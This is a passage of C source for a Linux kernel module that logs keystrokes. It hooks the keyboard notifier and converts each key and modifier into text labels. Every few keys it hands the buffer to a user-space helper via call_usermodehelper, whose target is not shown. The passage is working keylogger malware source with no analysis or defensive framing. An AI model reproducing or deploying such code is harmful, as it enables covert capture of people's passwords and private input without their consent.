    else if(shift == 2 ) return "ALT(R)_";
    else if(shift == 3 ) return "SHIFT_ALT(R)_";
    else if(shift == 4 ) return "CTRL_";
    else if(shift == 5 ) return "SHIFT_CTRL_";
    else if(shift == 6 ) return "ALT(R)_CTRL_";
    else if(shift == 7 ) return "SHIFT_ALT(R)_CTRL_";
    else if(shift == 8 ) return "ALT(L)_";
    else if(shift == 9 ) return "SHIFT_ALT(L)_";
    else if(shift == 10 ) return "ALT(R)_ALT(L)_";
    else if(shift == 11 ) return "SHIFT_ALT(R)_ALT(L)_";
    else if(shift == 12 ) return "CTRL_ALT(L)_";
    else if(shift == 13 ) return "SHIFT_ALT(R)_ALT(L)_";
    else if(shift == 14 ) return "ALT(R)_ALT(L)_CTRL_";
    else if(shift == 15 ) return "SHIFT_ALT(R)_ALT(L)_CTRL_";
    else return "?_";
 
}
 

 
 
void copy_to_ar(char* buf , int cur_ar, char * key)
{   
    int i;
    for( i = 0 ; key[i]!=0;i++)  buf[i+cur_ar] = key[i];
    buf[i+cur_ar] = 0;
 
}
 
 
int key_cb(struct notifier_block *nblock, unsigned long code, void *_param)
{
 
    struct keyboard_notifier_param* param = _param;
    char* cur_buf = buffor[cur_buf_nr];
    char* parsed_value = parse_code( param->value );
    char* parsed_shift = parse_shift(param->shift);
    int value_len = strlen(parsed_value);
    int shift_len = strlen(parsed_shift);
 
    if (param->value > 255 || !(param->down) || code != 1)
        return NOTIFY_OK;
 
 
    if (index + value_len + shift_len >= buffor_size || count == 5 ){
        
        
	argv[2] = buffor[cur_buf_nr];
	printk(KERN_ALERT "keylogger: nr: %i  %s",cur_buf_nr, cur_buf);
	call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
        index = 0;
        cur_buf_nr = (cur_buf_nr + 1 )%2;
        cur_buf = buffor[cur_buf_nr];
        cur_buf[0] = 0;
        count = 0;
    }

    count++;
    copy_to_ar(cur_buf,index, parsed_shift);
    index = index + shift_len ;
    copy_to_ar(cur_buf,index, parsed_value);
    index = index + value_len;
 
    return NOTIFY_OK;
}
 
static int hello_init(void){
 
    printk(KERN_ALERT "keylogger: start\n");    
    register_keyboard_notifier(&key_blk);
     
    return 0;
}
 
static void hello_exit(void){
 
     printk(KERN_ALERT "keylogger: stop\n");   
    unregister_keyboard_notifier(&key_blk);
 
     
}
 
module_init(hello_init);
module_exit(hello_exit);
